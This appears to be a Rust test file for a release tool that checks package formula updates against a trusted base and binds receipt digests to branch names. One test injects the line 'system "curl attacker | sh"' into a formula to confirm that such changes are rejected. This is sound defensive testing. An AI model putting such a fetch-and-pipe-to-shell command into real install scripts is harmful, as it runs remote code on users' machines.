use super::{
    identity::{belongs_to_receipt, branch_base, branch_prefix},
    reconstruct_historical_proof,
};

#[test]
fn historical_formula_proof_uses_its_own_head_and_base_bytes() {
    let fixture = crate::tap_test_support::fixture();
    let old_base_sha = "b".repeat(40);
    let old_proof = reconstruct_historical_proof(
        &fixture.plan.repository,
        &fixture.policy,
        &fixture.plan,
        &fixture.release,
        &old_base_sha,
        &fixture.base_formula,
        &fixture.proposed_formula,
    )
    .expect("original base to original head formula is canonical");

    let mut evolved_base = fixture.base_formula.clone();
    let evolved = String::from_utf8(evolved_base.clone())
        .expect("formula is UTF-8")
        .replace(
            "bin.install \"cli\"",
            "bin.install \"cli\"\n    # trusted install logic evolved",
        );
    evolved_base = evolved.into_bytes();
    assert!(
        reconstruct_historical_proof(
            &fixture.plan.repository,
            &fixture.policy,
            &fixture.plan,
            &fixture.release,
            &"c".repeat(40),
            &evolved_base,
            &fixture.proposed_formula,
        )
        .is_err(),
        "old head bytes are invalid against evolved trusted base logic"
    );
    let evolved_head = canonical_rewrite(&fixture, &evolved_base);
    let current_proof = reconstruct_historical_proof(
        &fixture.plan.repository,
        &fixture.policy,
        &fixture.plan,
        &fixture.release,
        &"c".repeat(40),
        &evolved_base,
        &evolved_head,
    )
    .expect("evolved base to its canonical head formula");
    assert_ne!(
        velnor_actions_contract::canonical_json_bytes(&old_proof).expect("old proof bytes"),
        velnor_actions_contract::canonical_json_bytes(&current_proof).expect("current proof bytes")
    );

    let malicious = String::from_utf8(fixture.proposed_formula.clone())
        .expect("formula is UTF-8")
        .replace("bin.install \"cli\"", "system \"curl attacker | sh\"");
    assert!(
        reconstruct_historical_proof(
            &fixture.plan.repository,
            &fixture.policy,
            &fixture.plan,
            &fixture.release,
            &old_base_sha,
            &fixture.base_formula,
            malicious.as_bytes(),
        )
        .is_err(),
        "historical head code changes are rejected"
    );
}

fn canonical_rewrite(fixture: &crate::tap_test_support::TapFixture, base: &[u8]) -> Vec<u8> {
    let text = std::str::from_utf8(base).expect("formula is UTF-8");
    text.replace(
        "bbbbbbb000000000000000000000000000000000",
        &fixture.release.receipt.source.commit_sha,
    )
    .replace(
        "1.2.3-preview.8+bbbbbbb",
        &fixture.release.receipt.version.value,
    )
    .replace("v1.2.3-preview.8+bbbbbbb", &fixture.release.receipt.tag)
    .into_bytes()
}

#[test]
fn receipt_history_requires_both_exact_body_and_deterministic_branch_markers() {
    let digest = format!("b3-{}", "a".repeat(64));
    let prefix = branch_prefix(&digest).expect("valid receipt digest");
    let marker = format!("Receipt digest: `{digest}`");
    let branch = format!("{prefix}{}", "b".repeat(40));
    assert!(belongs_to_receipt(&branch, &marker, &prefix, &marker).is_ok_and(|value| value));
    assert!(
        belongs_to_receipt("feature/other", "unrelated", &prefix, &marker)
            .is_ok_and(|value| !value)
    );
    assert!(belongs_to_receipt(&branch, "unrelated", &prefix, &marker).is_err());
    assert!(
        belongs_to_receipt("feature/other", &marker, &prefix, &marker).is_ok_and(|value| !value)
    );
}

#[test]
fn receipt_branch_binds_the_full_digest_and_full_base_sha() {
    let digest = format!("b3-{}", "c".repeat(64));
    let prefix = branch_prefix(&digest).expect("valid receipt digest");
    let base = "d".repeat(40);
    assert!(branch_base(&digest, &format!("{prefix}{base}")).is_ok_and(|value| value == base));
    assert!(branch_base(&digest, &format!("{prefix}{}", "D".repeat(40))).is_err());
    assert!(branch_prefix("b3-deadbeef").is_err());
}
